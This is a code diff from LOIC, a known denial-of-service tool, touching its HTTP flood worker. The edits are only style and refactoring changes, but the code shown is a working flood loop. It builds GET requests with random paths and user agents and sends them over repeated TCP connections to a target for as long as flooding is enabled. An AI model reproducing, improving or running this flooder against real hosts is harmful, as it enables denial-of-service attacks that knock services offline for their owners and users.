@@ -55,18 +55,16 @@ namespace LOIC
 			if (Tick() > LastAction + Timeout)
 			{
 				Failed++; State = ReqState.Failed;
-                tTimepoll.Stop();
-                if (IsFlooding)
-                {
-                    tTimepoll.Start();
-                }
+				tTimepoll.Stop();
+				if (IsFlooding)
+					tTimepoll.Start();
 			}
 		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? new Functions().RandomString() : null), new Functions().RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null), Environment.NewLine));
+				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : null), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null), Environment.NewLine));
 				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
@@ -75,10 +73,10 @@ namespace LOIC
 					byte[] recvBuf = new byte[64];
 					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
-					
+
 					try { socket.Connect(RHost); }
 					catch { continue; }
-					
+
 					socket.Blocking = Resp;
 					State = ReqState.Requesting; // SET STATE TO REQUESTING //
 					socket.Send(buf, SocketFlags.None);
@@ -87,7 +85,8 @@ namespace LOIC
 					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
 					tTimepoll.Stop();
 					tTimepoll.Start();
-					if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+					if (Delay >= 0)
+					System.Threading.Thread.Sleep(Delay+1);
 				}
 			}
 			catch { }
